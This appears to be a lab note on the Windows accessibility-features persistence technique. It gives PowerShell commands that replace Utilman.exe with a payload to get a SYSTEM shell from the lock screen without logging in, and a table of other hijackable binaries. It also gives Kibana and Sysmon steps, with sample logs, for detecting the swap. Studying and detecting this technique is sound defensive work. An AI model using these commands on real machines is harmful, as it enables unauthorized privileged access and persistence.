# [Accessibility Features](https://attack.mitre.org/techniques/T1546/008/)

## **Exploit syntax:**

1. Get a beacon with `system` privileges. 

2. Put a payload on the victim box if it's not already present.

3. In parrot open a blank text file and paste the following commands into it and choose either to move or copy the payload on the third line then set the `<payload path>` to the payload location on the victim box
   
    ```powershell
    takeown /f c:\windows\system32\Utilman.exe /A;
	icacls c:\windows\system32\Utilman.exe /grant administrators:F;
	rm c:\windows\system32\utilman.exe;
	<move/copy> <payload path> c:\windows\system32\Utilman.exe;
    ```
4. Save the file with as` NoobNoob.ps1` to `/tmp` on parrot-vm
5. Run
	```sh
	sudo chmod +x /tmp/NoobNoob.ps1
	```

6.  In posh, run
    ```pwoershell
	pslo /tmp/NoobNoob.ps1
    ```
7. From the login lockscreen of the windows box, press the windows key and 'U'
and the payload will execute. No login is required. Should give you System privileges.   

  
### **Affected Programs**
| Description        | Executable        | Keyboard Shortcut         |
|--------------------|-------------------|---------------------------|
| Sticky Keys        | sethc.exe         | Shift 5 times             |
| On-Screen Keyboard | osk.exe           | Windows + Control + U     |
| Utility Manager    | utilman.exe       | Windows + U               |
| Display Switcher   | DisplaySwitch.exe | Windows + P               |
| App Switcher       | AtBroker.exe      | Alt + Tab                 |
| Magnifier          | Magnify.exe       | Windows + +               |
| Narrator           | Narrator.exe      | Windows + Control + Enter |


---

## **Detection Technique:**

* Observe common Windows Accessibility Features executables and verify hashes or see if the FileVersion, Description, Product, Company and OriginalFileName fields are populating in Kibana. They populate for real Windows processes
	* sethc.exe 
	* Utilman.exe
	* osk.exe
	* Narrator.exe
	* Magnify.exe
* Within Kibana ( Using winlogbeat-* indices ):
	* Identify process creations by filtering `event.code: 1`
	* Add relevant fields to columns for search ease.
	* Correlate the `process.name` / `process.id` fields with the `process.parent.name` / `process.parent.id` fields.
	* Look at the `process.command_line` to see what the process actions were, if any.

		* GOOD process 'message' field
		```
		Process Create:
		RuleName: -
		UtcTime: 2022-09-19 13:30:14.660
		ProcessGuid: {135E01F6-6EE6-6328-BC1B-020000004700}
		ProcessId: 396
		Image: C:\Windows\System32\Utilman.exe
		FileVersion: 10.0.14393.0 (rs1_release.160715-1616)
		Description: Utility Manager
		Product: Microsoft® Windows® Operating System
		Company: Microsoft Corporation
		OriginalFileName: utilman2.exe
		CommandLine: utilman.exe /debug
		CurrentDirectory: C:\Windows\system32\
		User: meetech\judah.clark
		LogonGuid: {135E01F6-26E4-631A-EDD5-0C0000000000}
		LogonId: 0xCD5ED
		TerminalSessionId: 2
		IntegrityLevel: High
		Hashes: MD5=AA765332ACD18BCCB031A55FA64D5957,				SHA256=4B4B20BB9BFCF79C2AA4EDC39C649CA6244851B95B1F3842A187450D4E		2BEBE1,IMPHASH=B73D82E52D8EE9903A01CA25EA34B629
		ParentProcessGuid: {135E01F6-26CF-631A-AE00-000000004700}
		ParentProcessId: 5300
		ParentImage: C:\Windows\System32\winlogon.exe
		ParentCommandLine: winlogon.exe
		```
		* BAD process 'message' field
		```
		Process Create:
		RuleName: -
		UtcTime: 2022-09-19 13:28:26.093
		ProcessGuid: {1D01946E-6E7A-6328-E9D4-000000004600}
		ProcessId: 2116
		Image: C:\Windows\System32\Utilman.exe
		FileVersion: -
		Description: -
		Product: -
		Company: -
		OriginalFileName: -
		CommandLine: utilman.exe /debug
		CurrentDirectory: C:\Windows\system32\
		User: NT AUTHORITY\SYSTEM
		LogonGuid: {1D01946E-AFB5-6320-E703-000000000000}
		LogonId: 0x3E7
		TerminalSessionId: 2
		IntegrityLevel: System
		Hashes: MD5=16CD0325A81BAC885909F1EAE8E5BA29,SHA256=2B100252E36FE15C9A35F1D3A6B62A0BF2E905627D0A724C0C5B2F6D73757276,IMPHASH=56866F4C89500EE85F5CA6384C952D89
		ParentProcessGuid: {1D01946E-7D4C-6324-1767-000000004600}
		ParentProcessId: 444
		ParentImage: C:\Windows\System32\winlogon.exe
		ParentCommandLine: winlogon.exe
		```
---

## **Resources**

* https://dmfrsecurity.com/2021/09/10/accessibility-features-persistence/ 
* https://www.ired.team/offensive-security/persistence/t1015-sethc

### **Execution and Detection method explained**
* https://en.it-pirate.eu/windows-defender-atp-sticky-keys-binary-hijack-detected/